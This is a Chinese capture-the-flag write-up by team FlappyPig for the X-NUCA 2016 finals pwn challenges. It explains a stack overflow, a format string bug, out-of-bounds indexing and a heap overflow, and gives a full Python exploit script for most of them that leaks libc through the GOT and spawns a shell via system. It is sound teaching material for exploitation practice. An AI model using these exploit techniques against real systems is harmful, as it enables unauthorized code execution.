# 【CTF攻略】全国高校网安联赛-决赛 X-NUCA 2016 PWN Writeup
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**作者：**[ **FlappyPig**
****](http://bobao.360.cn/member/contribute?uid=1184812799)
**预估稿费：300RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆 **[
**网页版**](http://bobao.360.cn/contribute/index)** 在线投稿**
**  
**
**前言**
上周参加了xnuca final的决赛（官网链接：），做了几个pwn题，整理如下。
**1\. heap overflow?**
这是个人赛的第一个pwn题，题目说明如下:
**漏洞:**
分析程序，最开始感觉可能是一个堆的问题，不过最后发现一个明显的栈溢出。
**利用：**
因为是简单栈溢出，利用方式比较简单，首先通过puts函数泄露出一个got中的函数地址，得到lib库的加载地址，然后返回到main，再次触发栈溢出。第二次栈溢出直接执行system("/bin/sh")
    from threading import Thread
    from zio import *
    target = './pwn_zy'
    def add(io, name, password, level, secret):
        io.read_until('option:')
        io.writeline('1')
        io.read_until(':')
        io.writeline(name)
        io.read_until(':')
        io.writeline(password)
        io.read_until(':')
        io.writeline(str(level))
        io.read_until(':')
        io.writeline(secret)
    def edit(io, name, password, level, secret, payload):
        io.read_until('option:')
        io.writeline('4')
        io.read_until(':')
        io.writeline(name)
        io.read_until(':')
        io.writeline(password)
        io.read_until(':')
        io.writeline(str(level))
        io.read_until(':')
        io.writeline(secret)
        io.read_until('y/n')
        io.writeline(payload)
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        puts_plt = 0x080484F0
        puts_got = 0x0804B020
        main= 0x08048A8F
        payload = 'a'*(0x7a+4) + l32(puts_plt) + l32(main) + l32(puts_got)
        add(io, '123', '456', 1, '789')
        edit(io, '123', '456', 1, '789', payload)
        io.read_until('recorded!n')
        puts = l32(io.read(4))
        #remote
        base = puts - 0x0005F140
        system = base + 0x0003A940
        binsh = base + 0x00158E8B
        payload = 'a'*(0x7a+4) + l32(system) + l32(main) + l32(binsh)
        add(io, '123', '456', 1, '789')
        edit(io, '123', '456', 1, '789', payload)
        io.interact()
    exp(target)
**2\. ai**
这是个人赛的第2个pwn，题目说明如下
**漏洞：**
也比较明显，scanf处存在栈溢出
**利用：**
这里有栈canary保护，所以不能覆盖到返回值。但是可以覆盖局部变量i、j、k等值。当覆盖j之后，可以通过函数指针 (*(&patterns +
j))改变程序的执行流程,同时可以控制第一个参数和第二个参数.如果控制得当，可以多次执行到该函数指针。
**利用思路如下：**
1\. printf(scanf_got)泄露出scanf_got，得到libc加载地址。
2\. scanf("%s", 0x601f00) 将system的地址写入到0x601f00中。
3\. system("sh")
    from zio import *
    target = './ai'
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        scanf_got = 0x601048
        sss = 0x0000000000400AF3 #%s
        sh = 0x4003d7 #sh
        payload = ']'+str(scanf_got)+'  # 1 = 2 ;'
        payload2 = ']'+str(sss)+'  # '+str(0x601f00)+' = 0 ;'
        payload3 = ']'+str(sh)+'  # 1 = 2 ;'
        for i in range(10):
            if i == 1:
                io.writeline(payload2)
            elif i == 2:
                io.writeline(payload3)
            else:
                io.writeline(payload)
        payload = '1234'+'1234'+l32(0xfffffffff)+l32(0xfffffff4)
        io.writeline(payload)
        io.read_until('875770417')
        print_addr = l64(io.read(6)+'x00x00')
        base = print_addr - 0x000000000006A790
        system = base + 0x0000000000045380
    exp(target)
**3\. ww**
这是团体赛的一个pwn，存在多个漏洞。
**格式化：**
在execute shell功能中存在格式化漏洞。
利用比较简单
    from zio import *
    target = './ww'
    def add(io, length, cmd):
        io.read_until('Exitn')
        io.writeline('1')
        io.read_until(':')
        io.writeline(str(length))
        io.read_until(':')
        io.writeline(cmd)
    def execute(io, id):
        io.read_until('Exitn')
        io.writeline('3')
        io.read_until(':')
        io.writeline(id)
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        io.gdb_hint()
        malloc_got = 0x0000000000603068
        add(io, 100, '%11$s')
        payload = '0;'
        payload = payload.ljust(8, 'a')
        payload += l64(malloc_got)+'b'*8
        execute(io, payload)
        io.read_until('excute 0n')
        malloc_addr = l64(io.read_until('Wel')[:-3].ljust(8, 'x00'))
        base = malloc_addr-0x0000000000083580
        system = base + 0x0000000000045390
        strtol_got = 0x0000000000603050
        system_high = (system>>16)&0xffff
        system_low = system&0xffff
        if system_high > system_low:
            formst = '%%%dc%%11$hn%%%dc%%12$hn' %(system_low, system_high-system_low)
        else:
            formst = '%%%dc%%12$hn%%%dc%%11$hn' %(system_high, system_low-system_high)
        add(io, 100, formst)
        payload = '1;'
        payload = payload.ljust(8, 'a')
        payload += l64(strtol_got)+l64(strtol_got+2)
        execute(io, payload)
        io.read_until('Exit')
        io.writeline('2')
        io.writeline('sh;')
        io.interact()
    exp(target)
**id越界：**
在edit和delete功能时，虽然检查了id的值，但是无效时，只是打印了invalid id，并没有退出或者返回，仍然可以越界读或者越界写。
利用的话需要找到二级指针，最后在程序的代码段中找到了两个满足条件的。
通过这两个二级指针，可以泄露和修改strtol和malloc__usable_size的got。
    from zio import *
    target = './ww'
    def add(io, length, cmd):
        io.read_until('Exitn')
        io.writeline('1')
        io.read_until(':')
        io.writeline(str(length))
        io.read_until(':')
        io.writeline(cmd)
    def execute(io, id):
        io.read_until('Exitn')
        io.writeline('3')
        io.read_until(':')
        io.writeline(id)
    def edit(io, id, cmd):
        io.read_until('Exitn')
        io.writeline('5')
        io.read_until(')')
        io.writeline(id)
        io.read_until(':')
        io.writeline(cmd)
    def delete(io, id):
        io.read_until('Exitn')
        io.writeline('2')
        io.read_until(')')
        io.writeline(id)
        io.read_until('content:n')
        return l64(io.readline()[:-1].ljust(8, 'x00'))
    def exp(target):
        io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
                 print_write=COLORED(RAW, 'green'))
        io.gdb_hint()
        malloc_got = 0x0000000000603068
        add(io, 100, '%11$s')
        malloc_size = delete(io, '-131752')
        print hex(malloc_size)
        base = malloc_size - 0x00000000000844C0
        system = base + 0x0000000000045390
        print hex(base)
        edit(io, '-131746', l64(system))
        io.read_until('Exit')
        io.writeline('2')
        io.writeline('sh;')
        io.interact()
    exp(target)
**堆溢出：**
在read_buff中，length为int，当length=0时，可以无限读入。
所以只要在new时指定长度为0，在edit时，就可以无限覆盖了。
因为这题没有free，利用的思路与hitcon 2016的一个题目类似.
参考链接 [[CTF Pwn之创造奇迹的Top Chunk](http://bobao.360.cn/ctf/learning/178.html)]